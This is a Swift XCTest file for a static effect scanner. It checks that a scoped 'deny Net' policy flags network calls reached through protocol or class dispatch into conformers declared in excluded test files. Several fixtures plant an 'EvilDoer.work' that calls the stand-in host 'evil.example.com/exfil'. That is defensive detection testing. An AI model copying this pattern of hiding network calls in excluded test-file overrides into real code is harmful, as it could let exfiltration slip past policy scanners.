import XCTest
import Foundation

/// **A SECOND CARDINAL SIN IN THE FIX THAT CLOSED THE FIRST ONE (`9496d73`).** That commit gave the peek
/// child a `--peek-context` union so a call FROM an excluded file INTO an in-scope one resolves — but it
/// preserved attribution by skipping any finding whose carrying function's `loc` sits in a CONTEXT file,
/// on the theory that "the primary gate already judged it". That theory is FALSE under CHA/dynamic
/// dispatch: the child resolves dispatch (protocol conformance, class override) over the UNION, so a
/// context function's effective effect set in that union can include an effect the PRIMARY scan never
/// computed, because the primary never saw the EXCLUDED file's conformer/override. File identity cannot
/// see this — the divergence is in the DISPATCH RESOLUTION, not in which file a declaration lives in.
///
/// MEASURED before this fix, on both shapes below (`deny Net Runner`, scoped so only the in-scope, "Runner"
/// -named caller matches): exit 0, `"policy ✓"`, `outOfScope: []` — while the exact same code under an
/// UNSCOPED `deny Net` exits 2, naming `EvilDoer.work` directly. The scoped case isolates the skip as the
/// only disclosure route for this shape, and that route went silent.
///
/// THE FIX: a context-file finding is no longer skipped outright. Its rule-matched effects are diffed
/// against what THIS RUN'S OWN finalized primary analysis (`effectors`, keyed by qualified name) already
/// found for that exact function — not against a file list. Effects already present in both are
/// "already judged", exactly as before. Effects present ONLY in the child's larger-universe computation
/// are new BECAUSE OF the union and must surface. Where the responsible excluded declaration can be named
/// unambiguously (a call edge this context function's own resolved `calls` reaches, landing in an excluded
/// file, whose own inferred effects include the new one), the finding is attributed THERE — not to the
/// in-scope call site that dispatches through it, matching `9496d73`'s own attribution rule one level up
/// the dispatch. Where it cannot be named with confidence, the finding is disclosed against the in-scope
/// call site under a distinct `dispatch-widened` class rather than dropped — a wrong-but-visible
/// attribution is recoverable, a silent drop is not.
final class PeekCHADispatchProcessTests: XCTestCase {

    private func bin() throws -> URL { try ProcessHarness.binaryURL(for: Self.self) }

    private func writeCommon(_ root: URL) throws {
        try """
        // swift-tools-version: 6.0
        import PackageDescription
        let package = Package(name: "App", targets: [.executableTarget(name: "App")])
        """.write(to: root.appendingPathComponent("Package.swift"), atomically: true, encoding: .utf8)
    }

    /// `PureDoer` is the ONLY conformer the primary scan (which excludes `Tests/`) ever sees, so
    /// `RunnerCaller.invoke`'s dispatch through `Doer` is pure there. `EvilDoer` — declared in a
    /// genuinely-excluded test-source file, no bug in the exclusion classifier being exercised here —
    /// conforms to the SAME protocol and performs `Net`. Only the CHILD's union-wide CHA can see it.
    private func protocolFixture() throws -> URL {
        let root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("candor-swift-peekcha-proto-\(UUID().uuidString)")
        let src = root.appendingPathComponent("Sources/App")
        let tst = root.appendingPathComponent("Tests/AppTests")
        try FileManager.default.createDirectory(at: src, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: tst, withIntermediateDirectories: true)
        try writeCommon(root)
        try "protocol Doer { func work() }\nstruct PureDoer: Doer { func work() { } }\n"
            .write(to: src.appendingPathComponent("Doer.swift"), atomically: true, encoding: .utf8)
        try """
        struct RunnerCaller {
            static func invoke() {
                let d: Doer = PureDoer()
                d.work()
            }
        }
        """.write(to: src.appendingPathComponent("RunnerCaller.swift"), atomically: true, encoding: .utf8)
        try """
        import XCTest
        import Foundation
        struct EvilDoer: Doer {
            func work() {
                let url = URL(string: "https://evil.example.com/exfil")!
                URLSession.shared.dataTask(with: url) { _, _, _ in }.resume()
            }
        }
        """.write(to: tst.appendingPathComponent("EvilTests.swift"), atomically: true, encoding: .utf8)
        return root
    }

    /// Same shape, class-hierarchy override instead of protocol conformance: `EvilDoer: Doer` overrides
    /// `work()` from an excluded file, `RunnerCaller.invoke` dispatches through the base class reference.
    private func classHierarchyFixture() throws -> URL {
        let root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("candor-swift-peekcha-class-\(UUID().uuidString)")
        let src = root.appendingPathComponent("Sources/App")
        let tst = root.appendingPathComponent("Tests/AppTests")
        try FileManager.default.createDirectory(at: src, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: tst, withIntermediateDirectories: true)
        try writeCommon(root)
        try "class Doer { func work() { } }\n"
            .write(to: src.appendingPathComponent("Doer.swift"), atomically: true, encoding: .utf8)
        try """
        struct RunnerCaller {
            static func invoke() {
                let d: Doer = Doer()
                d.work()
            }
        }
        """.write(to: src.appendingPathComponent("RunnerCaller.swift"), atomically: true, encoding: .utf8)
        try """
        import XCTest
        import Foundation
        class EvilDoer: Doer {
            override func work() {
                let url = URL(string: "https://evil.example.com/exfil")!
                URLSession.shared.dataTask(with: url) { _, _, _ in }.resume()
            }
        }
        """.write(to: tst.appendingPathComponent("EvilTests.swift"), atomically: true, encoding: .utf8)
        return root
    }

    private func scan(_ tree: URL, policy: String, out: String) throws -> (out: String, err: String, code: Int32) {
        let pol = tree.appendingPathComponent(".policy")
        try policy.write(to: pol, atomically: true, encoding: .utf8)
        return try ProcessHarness.run(try bin(),
                                       [tree.path, "--policy", pol.path,
                                        "--out", tree.appendingPathComponent(out).path],
                                       cwd: tree)
    }

    private func outOfScope(_ report: URL) throws -> [[String: Any]] {
        let d = try JSONSerialization.jsonObject(with: Data(contentsOf: report)) as? [String: Any]
        return (d?["outOfScope"] as? [[String: Any]]) ?? []
    }

    // MARK: - 1. Both CHA shapes, now caught

    /// Scoped so ONLY `RunnerCaller` matches (`EvilDoer`/`PureDoer` do not begin with `Runner`) — before
    /// this fix, `RunnerCaller.invoke`'s finding was a context-file match and was unconditionally
    /// skipped. Now: exit 2, `EvilDoer.work` named with `Net`, attributed to the excluded declaration.
    func testProtocolConformerInAnExcludedFileWideningAContextCallersDispatchIsDisclosed() throws {
        let tree = try protocolFixture()
        defer { try? FileManager.default.removeItem(at: tree) }
        let r = try scan(tree, policy: "deny Net Runner\n", out: "defect")
        XCTAssertEqual(r.code, 2, "an excluded protocol conformer widens an in-scope caller's dispatch to "
                       + "a denied effect — the verdict must be INCOMPLETE, never a clean pass: \(r.out)\n\(r.err)")
        let found = try outOfScope(tree.appendingPathComponent("defect.App.Swift.json"))
        XCTAssertEqual(found.count, 1, "exactly the excluded conformer, named once: \(found)")
        XCTAssertEqual(found.first?["fn"] as? String, "EvilDoer.work")
        XCTAssertEqual((found.first?["effects"] as? [String]) ?? [], ["Net"])
    }

    /// Identical shape via class inheritance and `override` instead of protocol conformance — the same
    /// CHA machinery, a different declaration kind, so the fix cannot be reading protocol declarations
    /// specifically rather than comparing effect sets.
    func testClassOverrideInAnExcludedFileWideningAContextCallersDispatchIsDisclosed() throws {
        let tree = try classHierarchyFixture()
        defer { try? FileManager.default.removeItem(at: tree) }
        let r = try scan(tree, policy: "deny Net Runner\n", out: "defect")
        XCTAssertEqual(r.code, 2, "an excluded subclass override widens an in-scope caller's dispatch to "
                       + "a denied effect — the verdict must be INCOMPLETE, never a clean pass: \(r.out)\n\(r.err)")
        let found = try outOfScope(tree.appendingPathComponent("defect.App.Swift.json"))
        XCTAssertEqual(found.count, 1, "exactly the excluded override, named once: \(found)")
        XCTAssertEqual(found.first?["fn"] as? String, "EvilDoer.work")
        XCTAssertEqual((found.first?["effects"] as? [String]) ?? [], ["Net"])
    }

    // MARK: - 2. Control: the unscoped rule already caught this directly

    /// Isolates the SCOPED rule as the only thing that made the defect silent: the identical tree, an
    /// UNSCOPED `deny Net`, already named `EvilDoer.work` directly (its own declaration matches trivially)
    /// before this fix existed. If this control did not fire, the fixture itself would be unsound.
    func testTheUnscopedPolicyControlAlreadyCatchesTheExcludedConformerDirectly() throws {
        let tree = try protocolFixture()
        defer { try? FileManager.default.removeItem(at: tree) }
        let r = try scan(tree, policy: "deny Net\n", out: "ctrl")
        XCTAssertEqual(r.code, 2)
        let found = try outOfScope(tree.appendingPathComponent("ctrl.App.Swift.json"))
        XCTAssertEqual(found.count, 1)
        XCTAssertEqual(found.first?["fn"] as? String, "EvilDoer.work")
    }

    // MARK: - 3. No duplicate when both routes name the same declaration

    /// The unscoped `deny Net` rule ALSO matches `RunnerCaller.invoke` directly (its dispatch-widened
    /// inferred set includes `Net` too) — so the SAME excluded declaration is reachable both directly (its
    /// own qual matches the rule) and derived (an in-scope caller's dispatch resolves into it). Must merge
    /// into one finding, not two: the ⟨0.29⟩ attribution defect goes both ways — a silent drop is a
    /// cardinal sin, a duplicate is a false OVER-charge, and this fix must not trade one for the other.
    func testBothAttributionRoutesToTheSameDeclarationDoNotDuplicate() throws {
        let tree = try protocolFixture()
        defer { try? FileManager.default.removeItem(at: tree) }
        let r = try scan(tree, policy: "deny Net\n", out: "dedupe")
        XCTAssertEqual(r.code, 2)
        let found = try outOfScope(tree.appendingPathComponent("dedupe.App.Swift.json"))
        XCTAssertEqual(found.count, 1, "one finding, not one per route that reaches it: \(found)")
    }

    // MARK: - 4. Over-charge control: an excluded conformer nothing calls is unaffected

    /// `EvilDoer` conforms to `Doer` but NOTHING in scope ever constructs one or dispatches through it —
    /// there is no call edge for the union to widen. The report must show exactly the same thing an
    /// ordinary (pre-CHA-fix) peek already showed for an unreachable excluded declaration: nothing new
    /// beyond what a direct scope match would find on its own.
    func testAnExcludedConformerNothingCallsIsUnaffected() throws {
        let root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("candor-swift-peekcha-unreached-\(UUID().uuidString)")
        let src = root.appendingPathComponent("Sources/App")
        let tst = root.appendingPathComponent("Tests/AppTests")
        try FileManager.default.createDirectory(at: src, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: tst, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        try writeCommon(root)
        try "protocol Doer { func work() }\nstruct PureDoer: Doer { func work() { } }\n"
            .write(to: src.appendingPathComponent("Doer.swift"), atomically: true, encoding: .utf8)
        try "struct RunnerCaller { static func invoke() { PureDoer().work() } }\n"
            .write(to: src.appendingPathComponent("RunnerCaller.swift"), atomically: true, encoding: .utf8)
        try """
        import XCTest
        import Foundation
        struct EvilDoer: Doer {
            func work() {
                let url = URL(string: "https://evil.example.com/exfil")!
                URLSession.shared.dataTask(with: url) { _, _, _ in }.resume()
            }
        }
        """.write(to: tst.appendingPathComponent("EvilTests.swift"), atomically: true, encoding: .utf8)
        let r = try scan(root, policy: "deny Net Runner\n", out: "unreached")
        // `RunnerCaller.invoke` calls the CONCRETE `PureDoer` directly (no protocol-typed variable), so
        // there is no dispatch site for the union to widen — the scoped rule still finds nothing on it,
        // exactly as it did before this fix. `EvilDoer.work` itself does not match scope "Runner", so it
        // stays unreported under THIS rule (an unscoped rule naming it directly is control #2 above).
        XCTAssertEqual(r.code, 0, "no reachable dispatch means nothing new to disclose: \(r.out)\n\(r.err)")
        let found = try outOfScope(root.appendingPathComponent("unreached.App.Swift.json"))
        XCTAssertEqual(found.count, 0, "no dispatch site means no widening to report: \(found)")
    }
}
